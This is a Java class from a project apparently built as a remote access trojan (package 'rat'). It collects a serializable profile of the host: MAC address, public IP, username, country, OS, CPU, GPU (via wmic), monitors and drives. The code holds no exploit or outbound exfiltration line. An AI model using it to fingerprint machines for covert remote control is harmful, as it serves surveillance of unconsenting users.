package main.java.rat.models;

import main.java.rat.Utils;

import javax.swing.filechooser.FileSystemView;
import java.awt.*;
import java.io.*;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;

public class ComputerInfo implements Serializable {

    private String macAddress;
    private String publicIp;
    private String os;
    private String computerUsername;
    private String country;
    private String[] CPUNames;
    private int CPUCores;
    private String[] GPUs;
    private String[] monitors;
    private String[] storages;

    public static ComputerInfo create() {
        ComputerInfo info = new ComputerInfo();
        info.setMacAddress(readMac());
        info.setPublicIp(readIp());
        info.setOs(readOsName());
        info.setComputerUsername(readUserName());
        info.setCountry(readCountry());
        info.setGPUNames(readCPUNames());
        info.setCPUCores(readCores());
        info.setGPUs(readGPUInfo());
        info.setMonitors(readMonitorInfo());
        info.setStorages(readStorages());

        return info;
    }

    private static String readMac() {
        try {
            InetAddress ip = InetAddress.getLocalHost();
            NetworkInterface network = NetworkInterface.getByInetAddress(ip);

            byte[] mac = network.getHardwareAddress();
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < mac.length; i++) {
                sb.append(String.format("%02X%s", mac[i], (i < mac.length - 1) ? ":" : ""));
            }

            return sb.toString();
        } catch (IOException e) {
            return null;
        }
    }

    private static String readIp() {
        try {
            URL whatismyip = new URL("http://checkip.amazonaws.com");
            BufferedReader in = new BufferedReader(new InputStreamReader(whatismyip.openStream()));
            String ip = in.readLine();
            in.close();
            return ip;
        } catch (Exception e) {
            return null;
        }
    }

    private static boolean isWindows() {
        return (System.getProperty("os.name").toLowerCase().indexOf("windows") == 0);
    }

    private static String[] readGPUInfo() {
        try {
            if (isWindows()) {
                String[] cmdReturn = Utils.executeCMDCommand("wmic path win32_VideoController get name", true)
                        .split("\r\n");

                if (cmdReturn.length >= 2) {
                    ArrayList<String> GPUs = new ArrayList<String>();
                    for (int i = 1; i < cmdReturn.length; i++) {
                        if (!(cmdReturn[i] == null || cmdReturn[i].isBlank()))
                            GPUs.add(cmdReturn[i]);
                    }
                    return GPUs.toArray(new String[]{});
                }
            }
        } catch (Exception ignored) {
        }
        return null;
    }


    private static String[] readCPUNames() {
        try {
            if (isWindows()) {
                //get CPU info
                String[] cmdReturn = Utils.executeCMDCommand("wmic cpu get name", true)
                        .split("\r\n");

                if (cmdReturn.length >= 2) {
                    ArrayList<String> GPUs = new ArrayList<String>();
                    for (int i = 1; i < cmdReturn.length; i++) {
                        if (!(cmdReturn[i] == null || cmdReturn[i].isBlank()))
                            GPUs.add(cmdReturn[i]);
                    }
                    return GPUs.toArray(new String[]{});
                }
            }
        } catch (Exception ignored) {
        }
        return null;
    }

    private static String[] readMonitorInfo() {
        if (!Utils.isHeadless()) {
            GraphicsDevice mainMonitor = readMainMonitor();
            GraphicsDevice[] monitors = readMonitors();
            String[] monitorsInfo = new String[monitors.length];

            for (int i = 0; i < monitors.length; i++) {
                DisplayMode displayMode = monitors[i].getDisplayMode();
                String info = displayMode.getWidth() + "x" + displayMode.getHeight() + " @" + displayMode.getRefreshRate() + "Hz";

                if (monitors[i].equals(mainMonitor)) {
                    monitorsInfo[i] = "(main) ";
                } else {
                    monitorsInfo[i] = "";
                }
                monitorsInfo[i] += info;

            }
            return monitorsInfo;
        }

        return null;

    }

    private static GraphicsDevice[] readMonitors() throws HeadlessException {
        return GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices();
    }

    private static GraphicsDevice readMainMonitor() throws HeadlessException {
        return GraphicsEnvironment.getLocalGraphicsEnvironment().getDefaultScreenDevice();
    }

    private static String readOsName() {
        return System.getProperty("os.name");
    }

    private static String readUserName() {
        return System.getProperty("user.name");
    }

    private static String readCountry() {
        return System.getProperty("user.country");
    }

    private static int readCores() {
        return Runtime.getRuntime().availableProcessors();
    }

    private static String[] readStorages() {
        File[] roots = File.listRoots();
        FileSystemView fsv = FileSystemView.getFileSystemView();
        String[] storageInfo = new String[roots.length];

        for (int i = 0; i < roots.length; i++) {
            String name = fsv.getSystemDisplayName(roots[i]);
            long space = roots[i].getTotalSpace();
            storageInfo[i] = name + ", " + Utils.readableByteSize(space);
        }
        return storageInfo;
    }

    public String getMacAddress() {
        return macAddress;
    }

    public void setMacAddress(String macAddress) {
        this.macAddress = macAddress;
    }

    public String getPublicIp() {
        return publicIp;
    }

    public void setPublicIp(String publicIp) {
        this.publicIp = publicIp;
    }

    public String getOs() {
        return os;
    }

    public void setOs(String os) {
        this.os = os;
    }

    public String getComputerUsername() {
        return computerUsername;
    }

    public void setComputerUsername(String computerUsername) {
        this.computerUsername = computerUsername;
    }

    public String getCountry() {
        return country;
    }

    public void setCountry(String country) {
        this.country = country;
    }

    public String[] getCPUNames() {
        return CPUNames;
    }

    public void setGPUNames(String[] cpuNames) {
        this.CPUNames = cpuNames;
    }

    public int getCPUCores() {
        return CPUCores;
    }

    public void setCPUCores(int CPUCores) {
        this.CPUCores = CPUCores;
    }

    public String[] getMonitors() {
        return monitors;
    }

    public String[] getGPUs() {
        return GPUs;
    }

    public void setGPUs(String[] GPUs) {
        this.GPUs = GPUs;
    }

    public void setMonitors(String[] monitors) {
        this.monitors = monitors;
    }

    public String[] getStorages() {
        return storages;
    }

    public void setStorages(String[] storages) {
        this.storages = storages;
    }

    public ArrayList<String> getAsPrependList(String[] arr, String prependText) {
        ArrayList<String> newArr = new ArrayList<>();
        if (arr == null) {
            newArr.add(prependText + null);
        } else {
            for (String s : arr) {
                newArr.add(prependText + s);
            }
        }

        return newArr;
    }

}
